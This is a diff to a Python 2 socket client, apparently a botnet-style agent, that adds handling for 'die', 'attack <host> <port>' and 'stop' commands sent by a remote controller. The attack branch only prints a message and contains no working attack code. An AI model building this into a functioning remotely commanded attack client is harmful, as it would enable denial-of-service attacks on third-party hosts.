@@ -4,6 +4,7 @@ from sys import exit
 from time import sleep
 import socket, sys
 import os
+import re
 
 #comando para ver processos: ps -eo pid,ppid,stat,cmd
 #comando mais simples: top
@@ -50,9 +51,15 @@ try:
     while alive:
         data = receivemessage(s)
         print data
-        if data.rstrip() == "die":
+        data2 = data.rstrip()
+        if data2 == "die":
             s.send("die")
             alive = 0
+        if data2.startswith("attack"):
+            print "Attacking " + data2.split()[1] + " at port " + data2.split()[2]
+        if data2 == "stop":
+            print "Stop attacking"
+
 
 except KeyboardInterrupt:
     # Fim do programa
